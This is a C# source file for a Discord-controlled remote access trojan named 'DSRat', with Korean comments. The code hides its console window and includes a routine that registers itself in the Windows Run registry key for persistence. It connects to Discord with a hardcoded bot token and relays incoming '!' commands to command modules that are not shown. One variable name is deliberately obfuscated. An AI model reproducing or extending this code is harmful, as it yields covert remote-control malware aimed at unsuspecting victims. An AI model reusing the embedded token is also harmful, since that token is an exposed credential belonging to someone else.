using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Win32;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DSRat
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // 숨기기
        CommandService commands;
        DiscordSocketClient client;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            new Program().BotMain().GetAwaiter().GetResult();
            //MakeThisAppAutoRunOnStartUp();
        }
        public static void MakeThisAppAutoRunOnStartUp() // 시작프로그램 등록
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
           ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue("DiscordRat", Application.ExecutablePath.ToString());
        }
        public async Task BotMain()
        {
            commands = new CommandService(new CommandServiceConfig()
            {
                LogLevel = LogSeverity.Verbose
            });
            client = new DiscordSocketClient(new DiscordSocketConfig()
            {
                LogLevel = LogSeverity.Verbose
            });


            await client.LoginAsync(TokenType.Bot, "OTIzMTQ4MDE3NjM1MzI4MDAx.YcLylg.6LZ5MWw5L_6kaZETbbYY9sOxFMI"); //봇의 토큰을 사용해 서버에 로그인
            await client.StartAsync();                         //봇이 이벤트를 수신하기 시작

            client.MessageReceived += OnClientMessage;         //봇이 메시지를 수신할 때 처리하도록 설정

              await commands.AddModulesAsync(assembly: Assembly.GetEntryAssembly(), services: null);  //봇에 명령어 모듈 등록

            await Task.Delay(-1);
        }
        private async Task OnClientMessage(SocketMessage arg)
        {

            //수신한 메시지가 사용자가 보낸 게 아닐 때 취소
            var sdanjaksdnjk137419283NASDKJNADKSKJ = arg as SocketUserMessage;
            if (sdanjaksdnjk137419283NASDKJNADKSKJ == null) return;

            int pos = 0;

            //메시지 앞에 !이 달려있지 않고, 자신이 호출된게 아니거나 다른 봇이 호출했다면 취소
            if (!(sdanjaksdnjk137419283NASDKJNADKSKJ.HasCharPrefix('!', ref pos) ||
             sdanjaksdnjk137419283NASDKJNADKSKJ.HasMentionPrefix(client.CurrentUser, ref pos)) ||
              sdanjaksdnjk137419283NASDKJNADKSKJ.Author.IsBot)
                return;

            var context = new SocketCommandContext(client, sdanjaksdnjk137419283NASDKJNADKSKJ);                    

            var result = await commands.ExecuteAsync(
                    context: context,
                    argPos: pos,
                    services: null);
        }

    }
}
